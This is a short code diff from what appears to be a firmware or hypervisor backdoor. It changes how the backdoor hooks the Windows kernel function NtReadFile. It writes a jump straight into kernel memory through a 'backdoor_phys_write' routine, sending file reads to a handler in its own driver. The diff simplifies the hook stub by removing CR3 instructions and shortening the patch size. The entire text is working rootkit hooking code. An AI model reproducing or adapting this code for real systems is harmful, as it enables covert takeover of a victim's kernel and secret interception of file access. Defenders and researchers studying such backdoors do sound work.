@@ -1,7 +1,7 @@
 #include "stdafx.h"
 #include "vmcs.h"
 
-#define DRIVER_HOOK_SIZE 22
+#define DRIVER_HOOK_SIZE 14
 #define DRIVER_HOOK_SIZE_MAX 0x50
 
 #define PROCESSOR_START_BLOCK_ADDR 0x1000
@@ -630,16 +630,10 @@ _nt_found:
 
         memset(nt_func_jump, 0x90, sizeof(nt_func_jump));
 
-        // mov rax, cr3
-        *(uint32_t *)nt_func_jump = 0xd8200f90;
-
-        // mov cr3, rax
-        *(uint32_t *)(nt_func_jump + 4) = 0x90d8220f;
-
         // jump from function to handler
-        *(uint16_t *)(nt_func_jump + 8) = 0x25ff;
-        *(uint32_t *)(nt_func_jump + 10) = 0;
-        *(uint64_t *)(nt_func_jump + 14) = driver_base_virt + driver_new_NtReadFile;
+        *(uint16_t *)(nt_func_jump) = 0x25ff;
+        *(uint32_t *)(nt_func_jump + 2) = 0;
+        *(uint64_t *)(nt_func_jump + 6) = driver_base_virt + driver_new_NtReadFile;
 
         if (backdoor_phys_write(nt_func_phys, nt_func_jump, nt_func_saved_size) != 0)
         {
